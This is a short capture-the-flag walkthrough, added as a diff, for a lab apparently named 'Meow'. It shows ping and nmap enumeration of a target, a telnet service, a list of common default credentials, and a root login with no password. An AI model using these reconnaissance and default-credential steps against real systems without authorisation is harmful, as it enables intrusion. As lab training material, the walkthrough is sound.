@@ -1,0 +1,24 @@
+Meow Lab:
+First of all, lets ping the target
+-ping {target}
+
+then, enumerate services running:
+-nmap -sV {target}
+the result are:
+{
+PORT   STATE SERVICE VERSION
+23/tcp open  telnet  Linux telnetd
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+}
+
+well, look at the Telnet service... It is known for its simplicity, but also for the insecurity for more critical services.
+Common login for telnet services:
+admin:admin
+administrator:admin
+root
+
+so, lets see if it accept these credentials
+-telnet {target}
+--Login for Meow: root
+
+Boom, we got the access
